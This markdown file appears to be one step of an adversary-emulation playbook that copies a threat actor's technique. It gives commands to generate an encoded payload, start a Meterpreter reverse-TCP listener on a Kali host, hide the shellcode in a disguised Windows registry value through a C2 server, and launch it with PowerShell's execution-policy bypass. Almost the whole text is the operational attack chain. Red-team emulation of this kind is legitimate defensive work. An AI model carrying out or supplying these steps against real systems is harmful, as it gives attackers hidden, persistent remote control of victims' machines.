# Step 3

## Shellcode Generation

On Kali box (192.168.0.4):

`./create-payload.sh`

This will generate a Base64 encoded payload called reverseencoded.txt.

## Setup Meterpreter Handler

On Kali box (192.168.0.4):

`sudo msfconsole -r <path_to_this_dir>/start-tcp-listener.rc`

**Note:** Update these instructions with the actual path to `start-tcp-listener.rc` once fully known.

## Write Shellcode To Registry

Through C2 Server:

`exec-cmd 'REG ADD "HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer" /v "{018247B2CAC14652E}" /t REG_SZ /d <paste content from reverseencoded.txt>'`

**Note:** The original registry path from CTI doesn't appear to exist so chose this one. Also altereted the key name. Also instead of pasting in the future can just paste content in the command or figure out a way to automate.

## Run Shellcode via reverse.ps1
`exec-cmd "powershell.exe -ExecutionPolicy Bypass -NoExit -File reverse.ps1"`
